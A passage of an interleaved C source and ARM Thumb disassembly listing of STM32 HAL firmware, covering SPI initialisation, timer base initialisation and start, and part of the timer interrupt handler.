 8004aee:	d007      	beq.n	8004b00 <HAL_SPI_Init+0xa0>
 8004af0:	687b      	ldr	r3, [r7, #4]
 8004af2:	68db      	ldr	r3, [r3, #12]
 8004af4:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004af8:	d002      	beq.n	8004b00 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004afa:	687b      	ldr	r3, [r7, #4]
 8004afc:	2200      	movs	r2, #0
 8004afe:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004b00:	687b      	ldr	r3, [r7, #4]
 8004b02:	685b      	ldr	r3, [r3, #4]
 8004b04:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004b08:	687b      	ldr	r3, [r7, #4]
 8004b0a:	689b      	ldr	r3, [r3, #8]
 8004b0c:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004b10:	431a      	orrs	r2, r3
 8004b12:	687b      	ldr	r3, [r7, #4]
 8004b14:	691b      	ldr	r3, [r3, #16]
 8004b16:	f003 0302 	and.w	r3, r3, #2
 8004b1a:	431a      	orrs	r2, r3
 8004b1c:	687b      	ldr	r3, [r7, #4]
 8004b1e:	695b      	ldr	r3, [r3, #20]
 8004b20:	f003 0301 	and.w	r3, r3, #1
 8004b24:	431a      	orrs	r2, r3
 8004b26:	687b      	ldr	r3, [r7, #4]
 8004b28:	699b      	ldr	r3, [r3, #24]
 8004b2a:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004b2e:	431a      	orrs	r2, r3
 8004b30:	687b      	ldr	r3, [r7, #4]
 8004b32:	69db      	ldr	r3, [r3, #28]
 8004b34:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004b38:	431a      	orrs	r2, r3
 8004b3a:	687b      	ldr	r3, [r7, #4]
 8004b3c:	6a1b      	ldr	r3, [r3, #32]
 8004b3e:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004b42:	ea42 0103 	orr.w	r1, r2, r3
 8004b46:	687b      	ldr	r3, [r7, #4]
 8004b48:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004b4a:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004b4e:	687b      	ldr	r3, [r7, #4]
 8004b50:	681b      	ldr	r3, [r3, #0]
 8004b52:	430a      	orrs	r2, r1
 8004b54:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004b56:	687b      	ldr	r3, [r7, #4]
 8004b58:	699b      	ldr	r3, [r3, #24]
 8004b5a:	0c1b      	lsrs	r3, r3, #16
 8004b5c:	f003 0204 	and.w	r2, r3, #4
 8004b60:	687b      	ldr	r3, [r7, #4]
 8004b62:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b64:	f003 0310 	and.w	r3, r3, #16
 8004b68:	431a      	orrs	r2, r3
 8004b6a:	687b      	ldr	r3, [r7, #4]
 8004b6c:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004b6e:	f003 0308 	and.w	r3, r3, #8
 8004b72:	431a      	orrs	r2, r3
 8004b74:	687b      	ldr	r3, [r7, #4]
 8004b76:	68db      	ldr	r3, [r3, #12]
 8004b78:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004b7c:	ea42 0103 	orr.w	r1, r2, r3
 8004b80:	68fb      	ldr	r3, [r7, #12]
 8004b82:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004b86:	687b      	ldr	r3, [r7, #4]
 8004b88:	681b      	ldr	r3, [r3, #0]
 8004b8a:	430a      	orrs	r2, r1
 8004b8c:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004b8e:	687b      	ldr	r3, [r7, #4]
 8004b90:	2200      	movs	r2, #0
 8004b92:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004b94:	687b      	ldr	r3, [r7, #4]
 8004b96:	2201      	movs	r2, #1
 8004b98:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004b9c:	2300      	movs	r3, #0
}
 8004b9e:	4618      	mov	r0, r3
 8004ba0:	3710      	adds	r7, #16
 8004ba2:	46bd      	mov	sp, r7
 8004ba4:	bd80      	pop	{r7, pc}

08004ba6 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004ba6:	b580      	push	{r7, lr}
 8004ba8:	b082      	sub	sp, #8
 8004baa:	af00      	add	r7, sp, #0
 8004bac:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004bae:	687b      	ldr	r3, [r7, #4]
 8004bb0:	2b00      	cmp	r3, #0
 8004bb2:	d101      	bne.n	8004bb8 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004bb4:	2301      	movs	r3, #1
 8004bb6:	e049      	b.n	8004c4c <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004bb8:	687b      	ldr	r3, [r7, #4]
 8004bba:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004bbe:	b2db      	uxtb	r3, r3
 8004bc0:	2b00      	cmp	r3, #0
 8004bc2:	d106      	bne.n	8004bd2 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004bc4:	687b      	ldr	r3, [r7, #4]
 8004bc6:	2200      	movs	r2, #0
 8004bc8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004bcc:	6878      	ldr	r0, [r7, #4]
 8004bce:	f7fc f943 	bl	8000e58 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004bd2:	687b      	ldr	r3, [r7, #4]
 8004bd4:	2202      	movs	r2, #2
 8004bd6:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004bda:	687b      	ldr	r3, [r7, #4]
 8004bdc:	681a      	ldr	r2, [r3, #0]
 8004bde:	687b      	ldr	r3, [r7, #4]
 8004be0:	3304      	adds	r3, #4
 8004be2:	4619      	mov	r1, r3
 8004be4:	4610      	mov	r0, r2
 8004be6:	f000 fa7d 	bl	80050e4 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004bea:	687b      	ldr	r3, [r7, #4]
 8004bec:	2201      	movs	r2, #1
 8004bee:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004bf2:	687b      	ldr	r3, [r7, #4]
 8004bf4:	2201      	movs	r2, #1
 8004bf6:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004bfa:	687b      	ldr	r3, [r7, #4]
 8004bfc:	2201      	movs	r2, #1
 8004bfe:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004c02:	687b      	ldr	r3, [r7, #4]
 8004c04:	2201      	movs	r2, #1
 8004c06:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004c0a:	687b      	ldr	r3, [r7, #4]
 8004c0c:	2201      	movs	r2, #1
 8004c0e:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004c12:	687b      	ldr	r3, [r7, #4]
 8004c14:	2201      	movs	r2, #1
 8004c16:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004c1a:	687b      	ldr	r3, [r7, #4]
 8004c1c:	2201      	movs	r2, #1
 8004c1e:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004c22:	687b      	ldr	r3, [r7, #4]
 8004c24:	2201      	movs	r2, #1
 8004c26:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004c2a:	687b      	ldr	r3, [r7, #4]
 8004c2c:	2201      	movs	r2, #1
 8004c2e:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004c32:	687b      	ldr	r3, [r7, #4]
 8004c34:	2201      	movs	r2, #1
 8004c36:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004c3a:	687b      	ldr	r3, [r7, #4]
 8004c3c:	2201      	movs	r2, #1
 8004c3e:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004c42:	687b      	ldr	r3, [r7, #4]
 8004c44:	2201      	movs	r2, #1
 8004c46:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004c4a:	2300      	movs	r3, #0
}
 8004c4c:	4618      	mov	r0, r3
 8004c4e:	3708      	adds	r7, #8
 8004c50:	46bd      	mov	sp, r7
 8004c52:	bd80      	pop	{r7, pc}

08004c54 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004c54:	b480      	push	{r7}
 8004c56:	b085      	sub	sp, #20
 8004c58:	af00      	add	r7, sp, #0
 8004c5a:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004c5c:	687b      	ldr	r3, [r7, #4]
 8004c5e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004c62:	b2db      	uxtb	r3, r3
 8004c64:	2b01      	cmp	r3, #1
 8004c66:	d001      	beq.n	8004c6c <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004c68:	2301      	movs	r3, #1
 8004c6a:	e03b      	b.n	8004ce4 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004c6c:	687b      	ldr	r3, [r7, #4]
 8004c6e:	2202      	movs	r2, #2
 8004c70:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004c74:	687b      	ldr	r3, [r7, #4]
 8004c76:	681b      	ldr	r3, [r3, #0]
 8004c78:	68da      	ldr	r2, [r3, #12]
 8004c7a:	687b      	ldr	r3, [r7, #4]
 8004c7c:	681b      	ldr	r3, [r3, #0]
 8004c7e:	f042 0201 	orr.w	r2, r2, #1
 8004c82:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004c84:	687b      	ldr	r3, [r7, #4]
 8004c86:	681b      	ldr	r3, [r3, #0]
 8004c88:	4a19      	ldr	r2, [pc, #100]	; (8004cf0 <HAL_TIM_Base_Start_IT+0x9c>)
 8004c8a:	4293      	cmp	r3, r2
 8004c8c:	d009      	beq.n	8004ca2 <HAL_TIM_Base_Start_IT+0x4e>
 8004c8e:	687b      	ldr	r3, [r7, #4]
 8004c90:	681b      	ldr	r3, [r3, #0]
 8004c92:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004c96:	d004      	beq.n	8004ca2 <HAL_TIM_Base_Start_IT+0x4e>
 8004c98:	687b      	ldr	r3, [r7, #4]
 8004c9a:	681b      	ldr	r3, [r3, #0]
 8004c9c:	4a15      	ldr	r2, [pc, #84]	; (8004cf4 <HAL_TIM_Base_Start_IT+0xa0>)
 8004c9e:	4293      	cmp	r3, r2
 8004ca0:	d115      	bne.n	8004cce <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004ca2:	687b      	ldr	r3, [r7, #4]
 8004ca4:	681b      	ldr	r3, [r3, #0]
 8004ca6:	689a      	ldr	r2, [r3, #8]
 8004ca8:	4b13      	ldr	r3, [pc, #76]	; (8004cf8 <HAL_TIM_Base_Start_IT+0xa4>)
 8004caa:	4013      	ands	r3, r2
 8004cac:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004cae:	68fb      	ldr	r3, [r7, #12]
 8004cb0:	2b06      	cmp	r3, #6
 8004cb2:	d015      	beq.n	8004ce0 <HAL_TIM_Base_Start_IT+0x8c>
 8004cb4:	68fb      	ldr	r3, [r7, #12]
 8004cb6:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004cba:	d011      	beq.n	8004ce0 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004cbc:	687b      	ldr	r3, [r7, #4]
 8004cbe:	681b      	ldr	r3, [r3, #0]
 8004cc0:	681a      	ldr	r2, [r3, #0]
 8004cc2:	687b      	ldr	r3, [r7, #4]
 8004cc4:	681b      	ldr	r3, [r3, #0]
 8004cc6:	f042 0201 	orr.w	r2, r2, #1
 8004cca:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004ccc:	e008      	b.n	8004ce0 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004cce:	687b      	ldr	r3, [r7, #4]
 8004cd0:	681b      	ldr	r3, [r3, #0]
 8004cd2:	681a      	ldr	r2, [r3, #0]
 8004cd4:	687b      	ldr	r3, [r7, #4]
 8004cd6:	681b      	ldr	r3, [r3, #0]
 8004cd8:	f042 0201 	orr.w	r2, r2, #1
 8004cdc:	601a      	str	r2, [r3, #0]
 8004cde:	e000      	b.n	8004ce2 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004ce0:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004ce2:	2300      	movs	r3, #0
}
 8004ce4:	4618      	mov	r0, r3
 8004ce6:	3714      	adds	r7, #20
 8004ce8:	46bd      	mov	sp, r7
 8004cea:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004cee:	4770      	bx	lr
 8004cf0:	40012c00 	.word	0x40012c00
 8004cf4:	40014000 	.word	0x40014000
 8004cf8:	00010007 	.word	0x00010007

08004cfc <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004cfc:	b580      	push	{r7, lr}
 8004cfe:	b084      	sub	sp, #16
 8004d00:	af00      	add	r7, sp, #0
 8004d02:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004d04:	687b      	ldr	r3, [r7, #4]
 8004d06:	681b      	ldr	r3, [r3, #0]
 8004d08:	68db      	ldr	r3, [r3, #12]
 8004d0a:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004d0c:	687b      	ldr	r3, [r7, #4]
 8004d0e:	681b      	ldr	r3, [r3, #0]
 8004d10:	691b      	ldr	r3, [r3, #16]
 8004d12:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004d14:	68bb      	ldr	r3, [r7, #8]
 8004d16:	f003 0302 	and.w	r3, r3, #2
 8004d1a:	2b00      	cmp	r3, #0
 8004d1c:	d020      	beq.n	8004d60 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004d1e:	68fb      	ldr	r3, [r7, #12]
 8004d20:	f003 0302 	and.w	r3, r3, #2
 8004d24:	2b00      	cmp	r3, #0
 8004d26:	d01b      	beq.n	8004d60 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004d28:	687b      	ldr	r3, [r7, #4]
 8004d2a:	681b      	ldr	r3, [r3, #0]
 8004d2c:	f06f 0202 	mvn.w	r2, #2
 8004d30:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004d32:	687b      	ldr	r3, [r7, #4]
 8004d34:	2201      	movs	r2, #1
 8004d36:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004d38:	687b      	ldr	r3, [r7, #4]
 8004d3a:	681b      	ldr	r3, [r3, #0]
 8004d3c:	699b      	ldr	r3, [r3, #24]
 8004d3e:	f003 0303 	and.w	r3, r3, #3
 8004d42:	2b00      	cmp	r3, #0
 8004d44:	d003      	beq.n	8004d4e <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004d46:	6878      	ldr	r0, [r7, #4]
 8004d48:	f000 f9ad 	bl	80050a6 <HAL_TIM_IC_CaptureCallback>
 8004d4c:	e005      	b.n	8004d5a <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004d4e:	6878      	ldr	r0, [r7, #4]
 8004d50:	f000 f99f 	bl	8005092 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004d54:	6878      	ldr	r0, [r7, #4]
 8004d56:	f000 f9b0 	bl	80050ba <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004d5a:	687b      	ldr	r3, [r7, #4]
 8004d5c:	2200      	movs	r2, #0
 8004d5e:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004d60:	68bb      	ldr	r3, [r7, #8]
 8004d62:	f003 0304 	and.w	r3, r3, #4
 8004d66:	2b00      	cmp	r3, #0
 8004d68:	d020      	beq.n	8004dac <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004d6a:	68fb      	ldr	r3, [r7, #12]
 8004d6c:	f003 0304 	and.w	r3, r3, #4
 8004d70:	2b00      	cmp	r3, #0
 8004d72:	d01b      	beq.n	8004dac <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004d74:	687b      	ldr	r3, [r7, #4]
 8004d76:	681b      	ldr	r3, [r3, #0]
 8004d78:	f06f 0204 	mvn.w	r2, #4
 8004d7c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004d7e:	687b      	ldr	r3, [r7, #4]
 8004d80:	2202      	movs	r2, #2
 8004d82:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004d84:	687b      	ldr	r3, [r7, #4]
 8004d86:	681b      	ldr	r3, [r3, #0]
 8004d88:	699b      	ldr	r3, [r3, #24]
 8004d8a:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004d8e:	2b00      	cmp	r3, #0
 8004d90:	d003      	beq.n	8004d9a <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004d92:	6878      	ldr	r0, [r7, #4]
 8004d94:	f000 f987 	bl	80050a6 <HAL_TIM_IC_CaptureCallback>
 8004d98:	e005      	b.n	8004da6 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004d9a:	6878      	ldr	r0, [r7, #4]
 8004d9c:	f000 f979 	bl	8005092 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004da0:	6878      	ldr	r0, [r7, #4]
 8004da2:	f000 f98a 	bl	80050ba <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004da6:	687b      	ldr	r3, [r7, #4]
 8004da8:	2200      	movs	r2, #0
 8004daa:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004dac:	68bb      	ldr	r3, [r7, #8]
 8004dae:	f003 0308 	and.w	r3, r3, #8
 8004db2:	2b00      	cmp	r3, #0
 8004db4:	d020      	beq.n	8004df8 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004db6:	68fb      	ldr	r3, [r7, #12]
 8004db8:	f003 0308 	and.w	r3, r3, #8
 8004dbc:	2b00      	cmp	r3, #0
 8004dbe:	d01b      	beq.n	8004df8 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004dc0:	687b      	ldr	r3, [r7, #4]
 8004dc2:	681b      	ldr	r3, [r3, #0]
 8004dc4:	f06f 0208 	mvn.w	r2, #8
 8004dc8:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004dca:	687b      	ldr	r3, [r7, #4]
 8004dcc:	2204      	movs	r2, #4
 8004dce:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004dd0:	687b      	ldr	r3, [r7, #4]
 8004dd2:	681b      	ldr	r3, [r3, #0]
 8004dd4:	69db      	ldr	r3, [r3, #28]
 8004dd6:	f003 0303 	and.w	r3, r3, #3
 8004dda:	2b00      	cmp	r3, #0
 8004ddc:	d003      	beq.n	8004de6 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004dde:	6878      	ldr	r0, [r7, #4]
 8004de0:	f000 f961 	bl	80050a6 <HAL_TIM_IC_CaptureCallback>
 8004de4:	e005      	b.n	8004df2 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004de6:	6878      	ldr	r0, [r7, #4]
 8004de8:	f000 f953 	bl	8005092 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004dec:	6878      	ldr	r0, [r7, #4]
 8004dee:	f000 f964 	bl	80050ba <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004df2:	687b      	ldr	r3, [r7, #4]
 8004df4:	2200      	movs	r2, #0
 8004df6:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004df8:	68bb      	ldr	r3, [r7, #8]
 8004dfa:	f003 0310 	and.w	r3, r3, #16
 8004dfe:	2b00      	cmp	r3, #0
 8004e00:	d020      	beq.n	8004e44 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004e02:	68fb      	ldr	r3, [r7, #12]
 8004e04:	f003 0310 	and.w	r3, r3, #16
 8004e08:	2b00      	cmp	r3, #0
 8004e0a:	d01b      	beq.n	8004e44 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004e0c:	687b      	ldr	r3, [r7, #4]
 8004e0e:	681b      	ldr	r3, [r3, #0]
 8004e10:	f06f 0210 	mvn.w	r2, #16
 8004e14:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004e16:	687b      	ldr	r3, [r7, #4]
 8004e18:	2208      	movs	r2, #8
 8004e1a:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004e1c:	687b      	ldr	r3, [r7, #4]
 8004e1e:	681b      	ldr	r3, [r3, #0]
 8004e20:	69db      	ldr	r3, [r3, #28]
 8004e22:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e26:	2b00      	cmp	r3, #0
 8004e28:	d003      	beq.n	8004e32 <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e2a:	6878      	ldr	r0, [r7, #4]
 8004e2c:	f000 f93b 	bl	80050a6 <HAL_TIM_IC_CaptureCallback>
 8004e30:	e005      	b.n	8004e3e <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e32:	6878      	ldr	r0, [r7, #4]
 8004e34:	f000 f92d 	bl	8005092 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e38:	6878      	ldr	r0, [r7, #4]
 8004e3a:	f000 f93e 	bl	80050ba <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e3e:	687b      	ldr	r3, [r7, #4]
 8004e40:	2200      	movs	r2, #0
 8004e42:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004e44:	68bb      	ldr	r3, [r7, #8]
 8004e46:	f003 0301 	and.w	r3, r3, #1
 8004e4a:	2b00      	cmp	r3, #0
 8004e4c:	d00c      	beq.n	8004e68 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004e4e:	68fb      	ldr	r3, [r7, #12]
 8004e50:	f003 0301 	and.w	r3, r3, #1
 8004e54:	2b00      	cmp	r3, #0
 8004e56:	d007      	beq.n	8004e68 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004e58:	687b      	ldr	r3, [r7, #4]
 8004e5a:	681b      	ldr	r3, [r3, #0]
 8004e5c:	f06f 0201 	mvn.w	r2, #1
 8004e60:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004e62:	6878      	ldr	r0, [r7, #4]
 8004e64:	f7fb fe64 	bl	8000b30 <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
